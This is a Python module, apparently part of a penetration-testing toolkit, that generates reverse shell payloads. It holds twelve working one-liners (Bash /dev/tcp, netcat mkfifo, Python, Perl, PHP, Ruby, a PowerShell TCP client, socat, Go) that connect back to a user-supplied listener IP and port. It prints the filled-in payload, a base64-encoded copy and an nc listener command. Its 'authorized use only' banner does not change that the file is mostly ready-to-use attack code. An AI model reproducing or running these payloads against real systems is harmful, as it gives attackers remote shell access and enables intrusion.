name = "Reverse Shell Generator"

SHELLS = {
    "1": ("Bash",       "bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "2": ("Bash mkfifo","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
    "3": ("Python 3",   'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''),
    "4": ("Python 2",   'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''),
    "5": ("Netcat",     "nc -e /bin/sh {ip} {port}"),
    "6": ("Netcat (nv)","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"),
    "7": ("Perl",       'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''),
    "8": ("PHP",        'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''),
    "9": ("Ruby",       'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''),
    "A": ("PowerShell", '$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'),
    "B": ("Socat",      "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"),
    "C": ("Golang",     'echo "package main;import(\\"os/exec\\";s\\"net\\");func main(){{c,_:=s.Dial(\\"tcp\\",\\"{ip}:{port}\\");cmd:=exec.Command(\\"/bin/sh\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}" > /tmp/t.go && go run /tmp/t.go &'),
}

def run():
    from utils.colors import banner, section, success, error, info, warn, CYAN, GREEN, RED, YELLOW, RESET
    from utils.helpers import get_input, prompt_save
    import base64

    banner("REVERSE SHELL GENERATOR", RED)
    print(f"\n  {RED}{'='*58}{RESET}")
    print(f"  {YELLOW}  EDUCATIONAL & AUTHORIZED TESTING USE ONLY{RESET}")
    print(f"  {YELLOW}  Unauthorized use is ILLEGAL. Know your laws.{RESET}")
    print(f"  {RED}{'='*58}{RESET}\n")

    confirm = input("  I acknowledge this is for authorized use only [yes/NO]: ")
    if confirm.lower() != "yes":
        warn("Cancelled.")
        return

    ip   = get_input("Your listener IP (LHOST)")
    port = get_input("Your listener port (LPORT, e.g. 4444)")
    if ip is None or port is None:
        return

    section("Select shell type:")
    for k, (name, _) in SHELLS.items():
        print(f"    [{k}] {name}")

    choice = get_input("Shell type").upper()
    if choice not in SHELLS:
        error("Invalid choice.")
        return

    name, template = SHELLS[choice]
    shell = template.replace("{ip}", ip).replace("{port}", port)

    section(f"{name} Reverse Shell")
    print(f"\n  {GREEN}{shell}{RESET}\n")

    section("Listener command (run on your machine)")
    print(f"  {CYAN}nc -lvnp {port}{RESET}")

    b64 = base64.b64encode(shell.encode()).decode()
    section("Base64 encoded payload")
    print(f"  {GREEN}{b64}{RESET}")

    output = f"Shell: {name}\nIP: {ip}\nPort: {port}\n\nPayload:\n{shell}\n\nBase64:\n{b64}"
    prompt_save(output, "reverse_shell")
